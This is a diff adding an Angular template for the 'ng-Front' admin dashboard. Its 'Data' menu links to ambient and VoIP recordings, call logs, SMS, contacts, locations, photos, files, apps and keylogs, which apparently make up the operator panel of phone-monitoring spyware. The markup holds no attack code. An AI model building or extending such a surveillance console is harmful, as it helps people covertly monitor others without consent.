@@ -1,0 +1,86 @@
+<div class="home">
+  <!-- navbar -->
+  <nav class="navbar">  
+    <div class="logo">
+      <h1>
+        <a routerLink="admin" routerLinkActive="active" ariaCurrentWhenActive="page"><span>ng-Front</span></a>
+      </h1>
+    </div>
+    <div class="navbar-items">
+      <div class="navbar-item">
+        <a routerLink="/dashboard" routerLinkActive="active" ariaCurrentWhenActive="page"><span>Dashboard</span></a>
+      </div>
+      <div class="navbar-item">
+        <a routerLink="/users" routerLinkActive="active" ariaCurrentWhenActive="page"><span>Users</span></a>
+      </div>
+      <div class="navbar-item">
+        <a routerLink="/helps" routerLinkActive="active" ariaCurrentWhenActive="page"><span>Helps</span></a>
+      </div>
+      <div class="navbar-item">
+        <a routerLink="/logs" routerLinkActive="active" ariaCurrentWhenActive="page"><span>Logs</span></a>
+      </div>
+      <div class="navbar-item">
+          <span class="dropdown">Data  <fa-icon [icon]="faAngleDown"></fa-icon>
+            <div class="dropdown-content">
+              <a routerLink="/ambient"><fa-icon [icon]="faMicrophone"></fa-icon>Ambient</a>
+              <a routerLink="/calllog"><fa-icon [icon]="faPhone"></fa-icon>Call Logs</a>
+              <a routerLink="/voip"><fa-icon [icon]="faMicrophone"></fa-icon>Voip Call</a>
+              <a routerLink="/contacts"><fa-icon [icon]="faContact"></fa-icon>Contacts</a>
+              <a routerLink="/locations"><fa-icon [icon]="faLocation"></fa-icon>Locations</a>
+              <a routerLink="/ims"><fa-icon [icon]="faVoicemail"></fa-icon>IMS</a>
+              <a routerLink="/photos"><fa-icon [icon]="faImage"></fa-icon>Photos</a>
+              <a routerLink="/videos"><fa-icon [icon]="faVideo"></fa-icon>Videos</a>
+              <a routerLink="/keylogs"><fa-icon [icon]="faKeyboard"></fa-icon>Keylogs</a>
+              <a routerLink="/sms"><fa-icon [icon]="faMessage"></fa-icon>SMS</a>
+              <a routerLink="/files"><fa-icon [icon]="faFile"></fa-icon>Files</a>
+              <a routerLink="/apps"><fa-icon [icon]="faListSquares"></fa-icon>Apps</a>
+            </div>
+          </span>
+      </div> 
+    </div>
+    <div class="right-menu">
+      
+      <div class="user">
+        <img src="{{profilePath}}" alt="">
+        <div class="user-menu">
+          <div class="row-one">
+            <fa-icon [icon]="faUser"></fa-icon>
+            <span>{{getUsername()}}</span>
+          </div>
+          <div class="row-two">
+            <a routerLink="/profile" class="profile">
+              <fa-icon [icon]="faUserAlt"></fa-icon>
+              <span>Profile</span>
+            </a>
+            <a  routerLink="/setting" class="setting">
+              <fa-icon [icon]="faGear"></fa-icon>
+              <span>Setting</span> 
+            </a>
+            <span class="logout" (click)="logout()">
+              <fa-icon [icon]="faSignOut"></fa-icon>
+              <span>Logout</span>
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </nav>
+  <div class="content">
+    <router-outlet></router-outlet>
+  </div>
+  <div class="footer">
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="footer-left-text">
+          <p>Copyright 2024 ng-Front</p>
+        </div>
+      </div>
+      <div class="footer-right">
+        <div class="footer-right-text">
+          <p>ng-Front</p>
+          <p>{{ currentDateAndTime }}</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
